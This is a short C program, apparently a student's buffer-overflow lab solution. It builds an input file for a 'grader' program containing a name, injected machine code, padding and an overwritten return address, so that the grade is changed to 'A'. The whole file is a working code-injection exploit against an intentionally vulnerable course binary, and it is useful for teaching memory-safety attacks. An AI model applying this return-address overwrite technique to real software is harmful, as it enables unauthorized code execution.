#include <stdio.h>
#include "miniassembler.h"
#include "miniassembler.c"

/* this program creates a file named "dataA" to be used as input to grader */
/* this files contains the name Ehsan and then our assembly code to give us a A grade */
/* then it fills the rest of the buffer with exclamation marks */
/* then it overwrites the return address with the start of our assembly code */

int main(void) {
    int i;
    int instruction[4];
    FILE *fp = fopen("dataA", "w");
    
    /* putting in the name Ehsan*/
    fputc('E', fp);
    fputc('h', fp);
    fputc('s', fp);
    fputc('a', fp);
    fputc('n', fp);
    fputc('\0', fp);

    /* making our machine code*/
    instruction[0] = MiniAssembler_adr(5, 0x420044);
    instruction[1] = MiniAssembler_mov(0, 65);
    instruction[2] = MiniAssembler_strb(0, 5);
    instruction[3] = MiniAssembler_b(0x40089c, 0x420061);

    /* writing our machine code to the file */
    for (i = 0; i < 4; i++) {
        fwrite(&instruction[i], sizeof(unsigned int), 1, fp);
    }

    /* filling the rest of the buffer with exclamation marks */
    for (i = 0; i < 26; i++) {
        fputc('!', fp);
    }
/* overwriting the return address with 0x42005e, the start of our assembly code */
    fputc(0x5e, fp);
    fputc(0x00, fp);
    fputc(0x42, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    
    
    fclose(fp);
    return 0;
}